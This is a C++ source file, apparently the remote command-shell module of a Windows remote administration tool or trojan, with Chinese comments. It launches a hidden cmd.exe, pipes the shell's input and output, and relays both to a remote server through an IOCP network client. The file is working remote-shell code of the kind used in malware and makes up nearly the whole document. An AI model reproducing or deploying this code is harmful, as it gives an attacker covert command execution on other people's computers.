#include "CmdManager.h"



CCmdManager::CCmdManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	m_ReceiveLength = 0;
	m_CmdProcessHandle = NULL;
	m_CmdThreadHandle = NULL;
	m_ReadHandle1  = NULL;
	m_ReadHandle2  = NULL;
	m_WriteHandle1 = NULL;
	m_WriteHandle2 = NULL;

	SECURITY_ATTRIBUTES  sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//创建一组管道与Cmd进程进行进程间通信
	if (!CreatePipe(&m_ReadHandle1, &m_WriteHandle2, &sa, 0))
	{
		if (m_ReadHandle1 != NULL)
		{
			CloseHandle(m_ReadHandle1);
		}
		if (m_WriteHandle2 != NULL)
		{
			CloseHandle(m_WriteHandle2);
		}
		return;
	}
	if (!CreatePipe(&m_ReadHandle2, &m_WriteHandle1, &sa, 0))
	{
		if (m_ReadHandle2 != NULL)
		{
			CloseHandle(m_ReadHandle2);
		}
		if (m_WriteHandle1 != NULL)
		{
			CloseHandle(m_WriteHandle1);
		}
		return;
	}

	//创建CMD子进程并且不显示页面
	char  CmdFullPath[MAX_PATH] = { 0 };
	GetSystemDirectory(CmdFullPath, MAX_PATH);
	strcat(CmdFullPath, "\\cmd.exe");

	STARTUPINFO  StartUpInfo = { 0 };
	PROCESS_INFORMATION   ProcessInfo = { 0 };

	memset((void*)&StartUpInfo, 0, sizeof(StartUpInfo));
	memset((void*)&ProcessInfo, 0, sizeof(ProcessInfo));

	StartUpInfo.cb = sizeof(STARTUPINFO);
	StartUpInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartUpInfo.hStdInput = m_ReadHandle2;
	StartUpInfo.hStdOutput = StartUpInfo.hStdError = m_WriteHandle2;
	StartUpInfo.wShowWindow = SW_HIDE;              //窗口隐藏

	//创建Cmd进程
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartUpInfo, &ProcessInfo))
	{
		CloseHandle(m_ReadHandle1);
		CloseHandle(m_WriteHandle2);
		CloseHandle(m_ReadHandle2);
		CloseHandle(m_WriteHandle1);
	}
	m_CmdProcessHandle = ProcessInfo.hProcess;
	m_CmdThreadHandle = ProcessInfo.hThread;
	m_IsLoop = TRUE;
	BYTE  IsToken = CLIENT_CMD_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken, 1);
	WaitingForServerDlgOpen();

	//创建线程来读取管道中的数据
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProcedure, this, 0, NULL);

}


CCmdManager::~CCmdManager()
{
	printf("~CCmdManager\r\n");
	m_IsLoop = FALSE;
	TerminateThread(m_CmdThreadHandle, 0);
	TerminateProcess(m_CmdProcessHandle, 0);
	Sleep(100);
	if (m_ReadHandle1 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle1);
		CloseHandle(m_ReadHandle1);
		m_ReadHandle1 = NULL;
	}
	if (m_WriteHandle2 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle2);
		CloseHandle(m_WriteHandle2);
		m_WriteHandle2 = NULL;
	}
	if (m_ReadHandle2 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle2);
		CloseHandle(m_ReadHandle2);
		m_ReadHandle2 = NULL;
	}
	if (m_WriteHandle1 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle1);
		CloseHandle(m_WriteHandle1);
		m_WriteHandle1 = NULL;
	}
}
void  CCmdManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	switch (BufferData[0])
	{
	case  CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		//接到有服务端传来的数据，将该数据写进管道
		unsigned  long  ReturnLength = 0;
		if (WriteFile(m_WriteHandle1, BufferData, BufferLength, &ReturnLength, NULL))
		{
		}
		m_ReceiveLength = ReturnLength - 2;
		break;
	}
	}
}
DWORD   CCmdManager::ReceiveProcedure(LPVOID  ParameterData)
{
	unsigned  long  ReturnLength = 0;
	char  v1[0x400] = { 0 };
	DWORD  BufferLength = 0;
	CCmdManager* This = (CCmdManager*)ParameterData;
	while (This->m_IsLoop)
	{
		Sleep(100);
		while (PeekNamedPipe(This->m_ReadHandle1,
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))
		{
			if (ReturnLength <= 0)
			{
				break;
			}
			memset(v1, 0, sizeof(v1));
			LPBYTE  BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);
			//读取管道数据
			ReadFile(This->m_ReadHandle1,
				BufferData, BufferLength, &ReturnLength, NULL);

			This->m_IOCPClient->OnSending((char*)BufferData + This->m_ReceiveLength, ReturnLength);
			LocalFree(BufferData);
		}
	}
	cout << "接收管道数据线程退出" << endl;
	return 0;
}